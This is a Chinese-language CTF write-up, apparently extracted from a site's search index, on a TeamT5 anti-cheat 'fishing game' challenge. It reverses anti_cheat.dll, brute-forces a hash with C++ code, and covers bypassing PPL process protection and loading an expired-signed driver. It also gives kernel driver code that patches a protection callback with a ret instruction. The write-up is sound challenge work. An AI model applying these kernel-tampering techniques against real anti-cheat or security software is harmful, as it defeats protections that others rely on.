\u56e0\u6b64\u5982\u679c\u8981\u7834\u89e3\u904a\u6232\u4fdd\u8b77\u7684\u8a71 \u5c31\u53ea\u8981\u627e\u5230 ObUnRegisterCallbacks \u9019\u500b\u51fd\u6578\u7684\u76f8\u95dc\u53c3\u6578\u5c31\u53ef\u4ee5\u4e86 \u53cd\u6b63\u5c31\u662f \u4ed6\u52a0\u5165\u8a3b\u518a\u8868\u5f8c\u6703\u52a0\u5165\u4ed6\u7684 linklist \u4e5f\u5c31\u662f\u8aaa \u6211\u5f9e\u4e2d\u6293\u53d6\u4e00\u500b \u4e26\u4e14\u904d\u6b77\u4ed6\u627e\u5230\u61c9\u8a72\u8981\u89e3\u9664\u4e86 \u6216\u662f\u76f4\u63a5\u628a\u5168\u90e8 linklist \u4e0a\u7684\u90fd\u53bb call ObUnRegisterCallbacks \u4e0d\u5c31\u89e3\u6c7a\u4e86\u55ce \u5982\u679c\u904d\u6b77\u627e\u4ed6\u7684\u8a71\u61c9\u8a72\u53ef\u4ee5\u7528\u5979\u7684 Altitude \u7684\u503c\u53bb\u627e </p>"},{"location":"writeup/TeamT5-%E9%87%A3%E9%AD%9A%E9%81%8A%E6%88%B2-WriteUp/","title":"TeamT5 \u91e3\u9b5a\u904a\u6232 WriteUp","text":""},{"location":"writeup/TeamT5-%E9%87%A3%E9%AD%9A%E9%81%8A%E6%88%B2-WriteUp/#part-1","title":"Part 1","text":"<p>\u9996\u5148\u7a0b\u5f0f\u958b\u555f\u5f8c\u53ef\u4ee5\u767c\u73fe Cheat Engine \u662f\u6c92\u6709\u8fa6\u6cd5\u53bb\u8b80\u53d6\u4ed6\u7684\uff0c\u9023 OpenProcess \u90fd\u4e0d\u884c\u3002 \u6211\u7b2c\u4e00\u500b\u60f3\u6cd5\u662f\u76f4\u63a5\u6253 dbk.sys \u5c31\u80fd\u5920\u76f4\u63a5\u505a\u9a45\u52d5\u8b80\u5beb\u4e86\u3002\u800c\u4e8b\u5be6\u4e5f\u662f\u76f4\u63a5\u5c31\u53ef\u4ee5\u8b80\u4e86\u3002</p> <p></p> <p>\u4e0d\u904e\u6211\u627e\u4e86\u4e00\u6bb5\u6642\u9593\u90fd\u6c92\u8fa6\u6cd5\u5f9e\u8a18\u61b6\u9ad4\u627e\u5230 Flag \u7684\u75d5\u8de1\uff0c\u751a\u9ebc Flag Magic \u4e4b\u985e\u7684\u90fd\u6c92\u627e\u5230 \u6211\u61f7\u7591\u7db2\u9801\u5728\u8aa4\u5c0e(X</p> <p>\u800c\u5f8c\u9762\u5728\u9006\u5411 anti_cheat.dll \u6642\u5c31\u767c\u73fe\u4e86 </p> <p>\u800c\u5728 DB20 \u7684\u4f4d\u7f6e\u6709\u4e00\u500b\u51fd\u6578\u5c31\u662f\u5728\u5c0d\u9019\u500b Flag \u53bb\u505a\u64cd\u4f5c \u5b83\u7684\u64cd\u4f5c\u770b\u8d77\u4f86\u50cf\u662f \u5229\u7528 GetModuleHandleW \u7372\u53d6\u67d0\u500b hModule \u7d50\u69cb \u7576\u4e2d\u6703\u5229\u7528\u5169\u500b\u7576\u4e2d\u7684\u53c3\u6578 \u7b2c\u4e00\u500b\u53c3\u6578\u6703\u5f71\u97ff\u4ed6\u662f\u5426\u8f38\u51fa Flag \u800c\u7b2c\u4e8c\u500b\u53c3\u6578\u4e0d\u6703 \u53ea\u6709\u7528\u5728\u751f\u6210 Flag \u5f97\u6642\u5019 \u4f46\u6700\u5f8c\u6211\u90fd\u6c92\u6709\u641e\u61c2\u7b2c\u4e8c\u500b\u53c3\u6578\u5728\u5e79\u561b##</p> <p>\u7136\u5f8c\u4ed6\u5c0d\u7b2c\u4e00\u500b\u64cd\u4f5c\u57fa\u672c\u4e0a\u662f \u53d6\u503c \u7136\u5f8c\u5c0d\u4ed6\u9032\u884c ltoa \u8f49\u6210\u5b57\u4e32 \u7136\u5f8c\u518d\u628a\u4ed6\u4e1f\u9032</p> <pre><code>int sub_10010C00(char *a1)\n\n{\n\n\u00a0 int v2; // [esp+D4h] [ebp-14h]\n\n\u00a0 int i; // [esp+E0h] [ebp-8h]\n\n\u00a0 for ( i = 5381; ; i = v2 + 33 * i )\n\n\u00a0 {\n\n\u00a0 \u00a0 v2 = *a1++;\n\n\u00a0 \u00a0 if ( !v2 )\n\n\u00a0 \u00a0 \u00a0 break;\n\n\u00a0 }\n\n\u00a0 return i;\n\n}\n</code></pre> <p>\u9019\u6a23\u7684\u4e00\u500b\u51fd\u6578\u4e2d\u53bb\u505a\u8655\u7406 \u6700\u5f8c\u8ddf 1174378711 \u53bb\u505a compare \u4e0d\u904e\u7576\u521d\u6211\u5361\u4e86\u578b\u5225\u7684\u554f\u984c \u52a0\u4e0a\u61c9\u8a72\u53ef\u4ee5\u7528 z3 \u89e3 \u4f46\u6211\u5beb\u721b\u4e86 \u7e3d\u4e4b\u5c31\u76f4\u63a5\u7206\u641c\u4e86 \u5177\u9ad4\u7684 code \u5982\u4e0b</p> <pre><code>#include &lt;bits/stdc++.h&gt;\n\nusing namespace std;\n\nint sub_10010C00(char *a1)\n{\n    int v2; // [esp+D4h] [ebp-14h]\n    int i; // [esp+E0h] [ebp-8h]\n    for ( i = 5381; ; i = v2 + 33 * i )\n    {\n        v2 = *a1++;\n        if ( !v2 )\n            break;\n    }\n    return i;\n}\n\nsigned main() {\n    long i = 1;\n    char src[sizeof(long)*8+1];\n    while(i++) {\n        memset(src, 0, 10);\n        ltoa(i, src, 10);\n        printf (\"%s\\n\",src);\n        int v4 = sub_10010C00(src);\n        if(v4 == 1174378711) {\n            cout &lt;&lt; '\\n';\n            cout &lt;&lt; i &lt;&lt; '\\n';\n            cout &lt;&lt; v4 &lt;&lt; '\\n';\n            break;\n        }\n    }\n}\n</code></pre> <p>\u6700\u5f8c\u6703\u8f38\u51fa 1836925 \u9019\u500b\u503c \u56e0\u6b64\u5982\u679c\u8981\u4ed6\u5f48\u51fa Flag \u5c31\u8981\u4fee\u6539\u4ed6\u7684\u7b2c\u4e00\u500b\u53c3\u6578\u70ba 1836925 \u9019\u500b\u6578\u5b57 \u800c\u5728\u4f7f\u7528 Cheat Engine \u6642\uff0c\u56e0\u70ba\u4ed6\u6709\u8a18\u61b6\u9ad4\u4fdd\u8b77 \u6240\u4ee5\u6700\u4e00\u958b\u59cb\u6211\u662f\u4f7f\u7528 DBVM \u4f86\u9032\u884c Debug</p> <p>\u6211\u6700\u4e00\u958b\u59cb\u5148\u900f\u904e\u641c\u5c0b\u5b57\u4e32 \u627e encrypt_flag \u7684\u7279\u5fb5 \u5c31\u662f\u6700\u4e00\u958b\u59cb\u5176\u5be6\u662f <code>[g8</code> \u9019\u6a23\u7684\u4e00\u500b\u5b57\u4e32 \u56e0\u70ba\u4ed6\u662f\u4e00\u500b while \u8ff4\u5708\u6703\u4e00\u76f4\u53bb\u505a Check \u6240\u4ee5\u90a3\u500b\u5b57\u4e32\u4e00\u5b9a\u53ef\u4ee5\u88ab\u641c\u5c0b\u5230 \u4e26\u4e14\u900f\u904e find access \u627e\u5230 DB20 \u8a72\u51fd\u6578\u4f4d\u7f6e</p> <p></p> <p>\u7136\u5f8c\u53bb\u4e0b\u65b7\u9ede\u4e26\u4e14\u4fee\u6539 register \u7684\u503c  \u6309\u4e0b Run \u4ee5\u5f8c Flag \u5c31\u5f48\u51fa\u4f86\u4e86 </p>"},{"location":"writeup/TeamT5-%E9%87%A3%E9%AD%9A%E9%81%8A%E6%88%B2-WriteUp/#bonus","title":"Bonus","text":"<p>\u4e0d\u904e \u4e4b\u5f8c\u6211\u4e5f\u77e5\u9053\u4e86\u8a18\u61b6\u9ad4\u4fdd\u8b77\u539f\u4f86\u662f\u53eb\u505a PPL  \u56e0\u6b64\u6211\u5728 Github \u4e0a\u627e\u5230\u4e86\u4e00\u500b\u53ef\u4ee5\u5229\u7528\u7684\u5c08\u6848\u5c31\u662f itm4n/PPLcontrol: Controlling Windows PP(L)s (github.com) \u5229\u7528\u9019\u500b\u5c31\u53ef\u4ee5\u4e0d\u7528\u53bb\u5229\u7528 DBVM \u4e86</p>"},{"location":"writeup/TeamT5-%E9%87%A3%E9%AD%9A%E9%81%8A%E6%88%B2-WriteUp/#part-2","title":"Part 2","text":"<p>Part 2 \u6211\u539f\u672c\u4e0d\u77e5\u9053\u8981\u600e\u9ebc\u4fee\u6539 Driver \u7684 asm \u56e0\u6b64\u89e3\u9019\u984c\u4e5f\u7b97\u662f\u5b78\u6703\u4e00\u500b\u65b0\u6771\u897f\u5427 xD \u6211\u539f\u672c\u7684\u60f3\u6cd5\u6bd4\u8f03\u8907\u96dc \u5c31\u662f\u5229\u7528 9176324/Shark: Turn off PatchGuard in real time for win7 (7600) ~ later (github.com) \u7136\u5f8c\u53bb\u505a SSDT Hook \u4fee\u6539\u6389 PsSetCreateProcessNotifyRoutine  \u4e0d\u904e\u5f8c\u9762\u767c\u73fe\u53ea\u8981\u627e\u51fa Driver \u7684 base address \u7136\u5f8c\u5beb driver \u53bb\u4fee\u6539\u5373\u53ef \u6211\u4fee\u6539\u7684\u5730\u65b9\u5c31\u662f\u5728\u4ed6\u5229\u7528 PsSetCreateProcessNotifyRoutine \u6703\u8abf\u7528\u7684 Function  \u8b93\u4ed6\u6700\u4e00\u958b\u59cb\u7684\u6307\u4ee4\u662f 0x3C \u4e5f\u5c31\u662f ret \u9019\u6a23\u5c31\u4e0d\u6703\u57f7\u884c\u57f7\u884c\u5230\u4ed6\u6aa2\u67e5\u95dc\u9589\u7684 Pid \u662f\u5426\u70ba Catfishing.exe \u7684\u4e86 \u57fa\u672c\u4e0a\u5c31\u9019\u6a23 \u9084\u6709\u5c31\u662f\u6709\u6253\u4e86\u4e00\u500b\u904e\u671f\u7c3d\u7ae0\u628a Driver \u5f04\u4e0a\u53bb \u4e0d\u7136\u5c31\u8981\u95dc\u9589 DSE \u8a73\u7d30 Code \u5982\u4e0b (\u70ba\u751a\u9ebc\u660e\u660e\u7814\u7a76\u6bd4\u8f03\u4e45\u537b WP \u5beb\u6bd4\u8f03\u77ed</p> <pre><code>#include &lt;ntifs.h&gt;\n#include &lt;ntddk.h&gt;\n\nNTKERNELAPI\nNTSTATUS\nMmCopyVirtualMemory(\n    _In_ PEPROCESS srcProcess,\n    _In_ PVOID srcAddr,\n    _In_ PEPROCESS dstProcess,\n    _In_ PVOID dstAddr,\n    _In_ SIZE_T DataSize,\n    _In_    KPROCESSOR_MODE PreviousMode,\n    _Out_    PSIZE_T RetureSize\n);\n\nNTSTATUS kReadProcessMemory(PEPROCESS Process, PVOID lpBaseAddress, PVOID lpBuffer, size_t nSize)\n{\n    PSIZE_T rSize;\n    return MmCopyVirtualMemory(Process, lpBaseAddress, PsGetCurrentProcess(), lpBuffer, nSize, KernelMode, &amp;rSize);\n}\n\n\nNTSTATUS kWriteProcessMemory(PEPROCESS Process, PVOID lpBaseAddress, PVOID lpBuffer, size_t nSize)\n{\n    PSIZE_T rSize;\n    return MmCopyVirtualMemory(PsGetCurrentProcess(), lpBuffer, Process, lpBaseAddress, nSize, KernelMode, &amp;rSize);\n}\n\nNTSTATUS DriverUnload(PDRIVER_OBJECT pDriverObject)\n{\n    return STATUS_SUCCESS;\n}\n\nNTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegister)\n{\n    pDriverObject-&gt;DriverUnload = DriverUnload;\n\n    PEPROCESS Process;\n    size_t pid = 4;\n    PsLookupProcessByProcessId((HANDLE)pid, &amp;Process);\n    PVOID addr = 0xFFFFF80542501C60; // \u9019\u908a\u61c9\u8a72\u53ef\u4ee5\u81ea\u52d5\u5316\u627e\u7684 \u4f46\u662f\u6700\u8fd1\u6c92\u4ec0\u9ebc\u6642\u9593\u5f04\u9019\u310d\n\n    int newValue = 195;\n    kWriteProcessMemory(Process, addr, &amp;newValue, sizeof(int));\n\n    int readValue = 0;\n    kReadProcessMemory(Process, addr, &amp;readValue, sizeof(int));\n\n    DbgPrintEx(0, 0, \"change value: %d\\n\", readValue);\n    return  STATUS_SUCCESS;\n}\n\n</code></pre>"}]}